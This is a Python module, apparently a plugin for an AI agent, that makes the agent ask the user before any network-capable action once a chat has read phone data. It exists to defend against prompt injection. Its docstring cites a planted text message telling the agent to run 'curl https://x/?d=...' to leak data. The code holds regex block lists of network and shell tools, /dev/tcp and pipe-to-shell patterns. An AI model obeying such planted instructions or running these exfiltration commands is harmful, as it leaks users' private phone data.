"""After a chat has read phone data, ask before anything that can send data out.

A text message the agent read can tell it to leak the rows ("run curl https://x/?d=..."). Once a chat has called
`phone_data` (whatever the outcome), this module makes `pre_tool_call` return Hermes's
`{"action": "approve", ...}`, which asks the user through the normal approval gate before: terminal commands that look
like network tools, code that talks to the network, web and browser tools, and message-sending tools. Reading files and
ordinary commands run as usual. Each ask uses a fresh `rule_key`, so no "always" or "this session" answer ever carries
over to the next one.

Honest limits: it is a speed bump. The command list is patterns, so a disguised command can slip through; the agent runs
in Termux and could edit the state file; and in Full access and Auto access Hermes's gate approves without asking.

The chats that have read are remembered in memory and in ~/.hermes/mobile/phone-read.json (chat ids and times only,
never data, at most MAX_CHATS, written atomically). A broken file means no entries.
Nothing here logs a command, a result or a message.
"""

from __future__ import annotations

import json
import os
import re
import secrets
import threading
import time
from pathlib import Path
from typing import Any, Dict, Iterator, Optional, Tuple

PATH = Path.home() / ".hermes" / "mobile" / "phone-read.json"
MAX_CHATS = 200
MAX_SHOWN = 300   # characters of a command shown in the ask
MAX_SCAN = 20000  # characters of a command or script looked at

_lock = threading.Lock()
_mem: Dict[str, float] = {}
_cache: tuple = (None, {})   # ((mtime_ns, inode, size), {chat: time})


def chat_id(session_id: Any = "", task_id: Any = "") -> str:
    """The same id phone_data.py keeps: the gateway's live session id (HERMES_UI_SESSION_ID, a ContextVar), else Hermes's."""
    try:
        from gateway.session_context import _SESSION_UI_SESSION_ID
        v = _SESSION_UI_SESSION_ID.get()
        if isinstance(v, str) and v:
            return v
    except Exception:
        pass
    return str(session_id or task_id or "")


def _file_chats() -> Dict[str, float]:
    global _cache
    try:
        s = PATH.stat()
        st = (s.st_mtime_ns, s.st_ino, s.st_size)
    except OSError:
        return {}
    if _cache[0] == st:
        return _cache[1]
    try:
        d = json.loads(PATH.read_text())
        raw = d.get("chats") if isinstance(d, dict) else None
        chats = {str(k)[:200]: float(v) for k, v in raw.items()} if isinstance(raw, dict) else {}
    except Exception:
        chats = {}   # a broken file means no entries
    _cache = (st, chats)
    return chats


def has_read(chat: str) -> bool:
    if not chat:
        return False
    with _lock:
        return chat in _mem or chat in _file_chats()


def mark(chat: str) -> None:
    """This chat has called phone_data. Never raises."""
    chat = str(chat or "").strip()[:200]
    if not chat:
        return
    try:
        with _lock:
            _mem.pop(chat, None)
            _mem[chat] = time.time()
            while len(_mem) > MAX_CHATS:
                _mem.pop(next(iter(_mem)))
            chats = dict(_file_chats())
            chats.pop(chat, None)
            chats[chat] = _mem[chat]
            while len(chats) > MAX_CHATS:
                chats.pop(next(iter(chats)))
            PATH.parent.mkdir(parents=True, exist_ok=True)
            tmp = PATH.with_name(PATH.name + f".{os.getpid()}.tmp")
            tmp.write_text(json.dumps({"chats": chats}))
            tmp.replace(PATH)
    except Exception:
        pass   # the in-memory entry still holds for this process


# ── what can send data out ──────────────────────────────────────────────────

_B = r"(?<![\w.-])"    # not in the middle of a word or a file name like my-curl.txt (a leading / is fine: /usr/bin/curl)
_E = r"(?![\w-])"
_NET_WORDS = ("curl wget nc ncat netcat socat ssh scp sftp rsync ftp tftp telnet nmap nslookup dig ping traceroute "
              "sendmail mail mutt msmtp ssmtp swaks mosquitto_pub aria2c lynx w3m links httpie http https xh "
              "termux-sms-send termux-share termux-open termux-open-url termux-telephony-call "
              "xdg-open").split()
_RE_NET = re.compile(_B + "(?:" + "|".join(re.escape(w) for w in _NET_WORDS) + ")" + _E)
_RE_OTHER = [re.compile(p) for p in (
    _B + r"git\s+(?:-[\w-]+(?:\s+[^\s-]\S*)?\s+)*(?:push|clone|fetch|pull|ls-remote|remote\s+add)" + _E,
    r"/dev/(?:tcp|udp)/",
    _B + r"am\s+(?:start|broadcast|startservice|start-activity)" + _E,
    _B + r"openssl\s+s_client" + _E,
    _B + r"(?:cmd\s+(?:activity|package)|service\s+call|monkey)" + _E,
    r"\|\s*(?:(?:/\S*/)?(?:ba|z|da|k|c)?sh)\b",   # a download piped into a shell, or decoded text run as one
    _B + r"eval\s",
)]
_RE_INTERP = re.compile(_B + r"(?:python[0-9.]*|pypy3?|node(?:js)?|deno|bun|perl|ruby|php|lua|tclsh|osascript)" + _E)
_RE_ONELINER = re.compile(r"(?:^|\s)(?:-c|-e|-E|-r|-p|-pe|-ne|-m\s*\S*|--eval|--exec|--print|-)(?=\s|$)|<<")
_RE_NETCODE = re.compile(
    r"urllib|requests|http\.client|httplib|httpx|aiohttp|socket|urlopen|ftplib|smtplib|telnetlib|paramiko|asyncssh|websocket"
    r"|xmlrpc|fetch\s*\(|XMLHttpRequest|net\.connect|require\(\s*['\"](?:https?|net|tls|dgram|child_process)"
    r"|https?\.(?:get|request)|node:(?:https?|net)|IO::Socket|LWP|Net::|open-uri|file_get_contents|fsockopen|curl_init"
    r"|\bsubprocess\b|os\.system|os\.popen|\bpopen\b|child_process|\bexec\s*\(|hermes_tools|web_search|web_extract|send_message",
    re.I)
_RE_URL = re.compile(r"https?://", re.I)

_ALWAYS = frozenset({"web_search", "web_extract", "x_search", "send_message", "react_to_message", "computer_use",
                     "delegate_task", "cronjob_manage", "image_generate", "video_generate"})
_IF_URL = frozenset({"vision_analyze", "video_analyze", "browser_get_images"})
# Never asked, whatever else matches: tools of this plugin that send nothing out.
_QUIET = frozenset({"phone_data", "phone_app", "canvas", "clarify", "memory", "todo", "todo_list", "read_file", "write_file",
                    "patch", "search_files", "skill_view", "skills_list", "session_search", "tool_search", "tool_describe"})


def _calls(tool_name: Any, args: Any) -> Iterator[Tuple[str, Dict[str, Any]]]:
    """The tool calls inside one call: Hermes's Tool Search bridge (`tool_call`) can carry several."""
    if tool_name == "tool_call" and isinstance(args, dict) and isinstance(args.get("calls"), list):
        for c in args["calls"]:
            if isinstance(c, dict) and c.get("name"):
                inner = c.get("arguments")
                yield str(c["name"]), inner if isinstance(inner, dict) else {}
        return
    yield str(tool_name or ""), args if isinstance(args, dict) else {}


def command_sends_out(text: str) -> bool:
    """True when a shell command (including a pipeline, `bash -c '...'` or `$(...)`) looks like it can send data out."""
    t = text[:MAX_SCAN]
    if _RE_NET.search(t) or any(r.search(t) for r in _RE_OTHER):
        return True
    return bool(_RE_INTERP.search(t) and (_RE_ONELINER.search(t) or _RE_NETCODE.search(t)))


def code_sends_out(text: str) -> bool:
    """True when a script given to execute_code can reach the network or run a command."""
    t = text[:MAX_SCAN]
    return bool(_RE_NETCODE.search(t) or command_sends_out(t))


def _first_text(a: Dict[str, Any], *keys: str) -> str:
    for k in keys:
        v = a.get(k)
        if isinstance(v, str) and v:
            return v
    return ""


def classify(name: str, a: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """None when the call sends nothing out, else (tool name, what to show the user)."""
    if name in _QUIET:
        return None
    if name == "terminal":
        cmd = _first_text(a, "command", "code")
        return (name, cmd) if command_sends_out(cmd) else None
    if name == "execute_code":
        code = _first_text(a, "code", "command")
        return (name, code) if code_sends_out(code) else None
    if name in _IF_URL:
        return (name, "") if any(isinstance(v, str) and _RE_URL.search(v) for v in a.values()) else None
    if name in _ALWAYS or name.startswith("browser_") or name.startswith("mcp_") or name.startswith("send_"):
        return name, _first_text(a, "url", "query")
    return None


def _flat(s: str) -> str:
    return " ".join(s.split())


def ask_text(name: str, shown: str) -> str:
    s = _flat(shown)
    s = (s[:MAX_SHOWN] + "…") if len(s) > MAX_SHOWN else s
    what = f"the tool {name}" if not s else (f"the command: {s}" if name == "terminal" else f"{name}: {s}")
    return ("This chat has read data from your phone, and the agent wants to run something that can send data out. "
            f"Allow only if you asked for it. It would run {what}")


def check(tool_name: Any, args: Any, chat: str) -> Optional[dict]:
    """A pre_tool_call directive asking the user, or None. The ask is a fresh one every time (new rule_key)."""
    if not has_read(chat):
        return None
    for name, a in _calls(tool_name, args):
        hit = classify(name, a)
        if hit is not None:
            return {"action": "approve", "message": ask_text(*hit), "rule_key": "phone_read_out:" + secrets.token_hex(8)}
    return None
